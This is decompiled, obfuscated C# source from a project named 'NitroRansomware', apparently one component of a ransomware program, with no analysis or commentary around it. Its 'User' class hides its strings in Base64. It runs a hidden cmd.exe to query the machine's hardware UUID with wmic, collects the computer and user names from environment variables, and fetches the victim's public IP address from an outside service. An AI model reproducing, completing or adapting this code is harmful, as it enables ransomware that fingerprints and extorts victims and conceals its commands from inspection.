using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NitroRansomware;

internal class User
{
	private class Cmd : IDisposable
	{
		private Process cmdProcess;

		private StreamWriter sw;

		private AutoResetEvent outputWaitHandle;

		private string cmdOutput;

		public Cmd(string cmdPath)
		{
			cmdProcess = new Process();
			outputWaitHandle = new AutoResetEvent(initialState: false);
			cmdOutput = string.Empty;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = cmdPath,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				CreateNoWindow = true
			};
			cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
			cmdProcess.StartInfo = startInfo;
			cmdProcess.Start();
			sw = cmdProcess.StandardInput;
			cmdProcess.BeginOutputReadLine();
		}

		public void Dispose()
		{
			cmdProcess.Close();
			cmdProcess.Dispose();
			sw.Close();
			sw.Dispose();
		}

		public string ExecuteCommand(string command)
		{
			cmdOutput = string.Empty;
			sw.WriteLine(command);
			sw.WriteLine("echo end");
			outputWaitHandle.WaitOne();
			return cmdOutput;
		}

		private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			if (e.Data == null || e.Data == "end")
			{
				outputWaitHandle.Set();
			}
			else
			{
				cmdOutput = cmdOutput + e.Data + Environment.NewLine;
			}
		}
	}

	private static Logs _1AqwDxXShKoP2aVZUaJd難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = new Logs(Encoding.UTF8.GetString(Convert.FromBase64String("REVCVUc=")), 0);

	public static string GK2fVnhMMEzJSIj6pfv6()
	{
		string result = string.Empty;
		try
		{
			using Cmd cmd = new Cmd(Encoding.UTF8.GetString(Convert.FromBase64String("Y21kLmV4ZQ==")));
			string text = cmd.ExecuteCommand(Encoding.UTF8.GetString(Convert.FromBase64String("d21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQ=")));
			result = text.Split(new char[1] { '\n' })[6];
		}
		catch (Exception ex)
		{
			_1AqwDxXShKoP2aVZUaJd難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex.Message);
		}
		return result;
	}

	public static List<string> prdhG0G6WNe9G7JR8LbP()
	{
		List<string> list = new List<string>();
		string environmentVariable = Environment.GetEnvironmentVariable(Encoding.UTF8.GetString(Convert.FromBase64String("Q09NUFVURVJOQU1F")));
		string environmentVariable2 = Environment.GetEnvironmentVariable(Encoding.UTF8.GetString(Convert.FromBase64String("VXNlck5hbWU=")));
		list.Add(environmentVariable);
		list.Add(environmentVariable2);
		return list;
	}

	public static string QKFdKfwTqoaefcoP6k8v()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				Task<HttpResponseMessage> async = val.GetAsync(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn")));
				Task<string> task = async.Result.get_Content().ReadAsStringAsync();
				result = task.Result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			_1AqwDxXShKoP2aVZUaJd難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化.cgZDU8hRT7h6BHd4APyg(ex.Message);
		}
		return result;
	}
}
